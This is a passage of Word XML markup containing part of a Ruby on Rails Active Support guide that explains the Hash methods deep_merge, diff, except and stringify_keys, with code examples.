        <w:t>merge</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> becomes the value in the resulting hash:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5110"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3250A62D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="24855473" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; {:b</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1}}.deep_merge(:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; {:c</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2})</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A058F21" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; {:a =&gt; {:b =&gt; 1, :c =&gt; 2}}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5B03E73C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>deep_merge!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> performs a deep merge in place.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FCACF4D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/hash/deep_merge.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="627F8307" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>11.3 Diffing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D29D60" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>diff</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns a hash that represents a diff of the receiver and the argument with the following logic:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AEC530D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="286"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Pairs </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that exist in both hashes do not belong to the diff hash.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173AF823" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="287"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If both hashes have </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>key</w:t>
      </w:r>
      <w:r>
        <w:t>, but with different values, the pair in the receiver wins.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4E0518" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="288"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>The rest is just merged.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6645"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="339CBD18" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="68265444" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1}.diff(:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="217B99C9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; {}, first rule</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DC768C5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="060B229D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1}.diff(:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="743B9ABA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; {:a =&gt; 1}, second rule</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DABCC87" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32D233BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1}.diff(:b</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45175ADC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; {:a =&gt; 1, :b =&gt; 2}, third rule</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C05802A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A12A7B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :b</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2, :c</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 3}.diff(:b</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :c</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 3, :d</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 4)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68B91D3A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; {:a =&gt; 1, :b =&gt; 2, :d =&gt; 4}, all rules</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20A31CAE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C8FF430" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{}.diff({})        # =&gt; {}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29979906" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1}.diff({}) # =&gt; {:a =&gt; 1}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37D64EE0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{}.diff(:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1)   # =&gt; {:a =&gt; 1}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1F0F13C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">An important property of this diff hash is that you can retrieve the original hash by applying </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>diff</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> twice:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6E1FBE85" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="20761C13" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="783694597"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>hash.diff(hash2).diff(hash2) == hash</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="52DCE84E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Diffing hashes may be useful for error messages related to expected option hashes for example.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FC8D911" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/hash/diff.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573C4E1F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>11.4 Working with Keys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F8DD94C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">11.4.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>except</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>except!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD610E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>except</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns a hash with the keys in the argument list removed, if present:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5135"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="778E4076" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="12523A2B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="980423298"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :b</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2}.except(:a) # =&gt; {:b =&gt; 2}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="274BDB97" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the receiver responds to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>convert_key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, the method is called on each of the arguments. This allows </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>except</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to play nice with hashes with indifferent access for instance:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6408"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6609EC1F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2433F8EA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1}.with_indifferent_access.except(:a)  # =&gt; {}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78E0E04D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1}.with_indifferent_access.except("a") # =&gt; {}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="25B44EBC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>except</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> may come in handy for example when you want to protect some parameter that can’t be globally protected with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_protected</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7848"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2F66C83C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="113D443D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>params[:account] = params[:account].except(:plan_id) unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>admin?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="766F85A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@account.update_attributes(params[:account])</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="151C6FC1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There’s also the bang variant </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>except!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that removes keys in the very receiver.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF7FD4D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/hash/except.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ABD6A0A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">11.4.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>stringify_keys</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>stringify_keys!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F99A6E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>stringify_keys</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns a hash that has a stringified version of the keys in the receiver. It does so by sending </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to them:</w:t>
      </w:r>
